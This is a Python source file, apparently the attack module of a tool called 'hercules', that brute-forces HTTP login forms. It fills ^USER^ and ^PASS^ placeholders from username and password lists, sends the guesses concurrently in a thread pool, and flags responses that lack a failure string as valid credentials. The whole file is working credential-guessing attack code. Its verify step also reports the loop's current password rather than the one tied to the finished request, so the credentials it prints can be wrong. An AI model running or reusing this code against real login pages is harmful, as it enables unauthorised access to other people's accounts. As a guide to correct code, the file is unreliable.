"""
attack.py
"""

import requests
import enlighten
import concurrent.futures
from hercules.request import RequestParser


class RequestPool(concurrent.futures.ThreadPoolExecutor):

    def __init__(self, max_workers):
        super().__init__(max_workers=max_workers) 

    def submit(self, prepared_request):
        return super().submit(self.make_request, prepared_request)

    def make_request(self, prepared_request):
        session = requests.Session()
        try:
            return session.send(prepared_request, timeout=5)
        except Exception as e:
            print(f'hercules.py: warning: {e}')


class BruteForce:

    def __init__(self, raw_request, threads, fail, tls):
        self.parser = RequestParser(raw_request, tls)
        self.threads = threads
        self.pool = RequestPool(max_workers=threads)
        self.fail = fail

    def verify(self, username, password, result):
        if not result or self.fail in result.text:
            return False

        print(f'hercules.py: info: valid credentials found'
              f'; username=\033[92m{username}\033[0m,'
              f'password=\033[92m{password}\033[0m')
        return True

    def attack_user(self, username, passwords, progress):
        incomplete = set()

        for password in passwords:
            r = self.parser.get_request()
            r.data = r.data.replace('^USER^', username).replace('^PASS^', password)
            incomplete.add(self.pool.submit(r.prepare())) 

            if len(incomplete) >= self.threads:
                complete, incomplete = concurrent.futures.wait(incomplete,
                    return_when=concurrent.futures.FIRST_COMPLETED)

                for future in complete:
                    progress.update()
                    if self.verify(username, password, future.result()):
                        return

    def attack(self, usernames, passwords):
        manager = enlighten.get_manager()
        progress = manager.counter(total=len(usernames)*len(passwords),
            desc='Progress')

        for username in usernames:
            self.attack_user(username, passwords, progress)
        manager.stop()

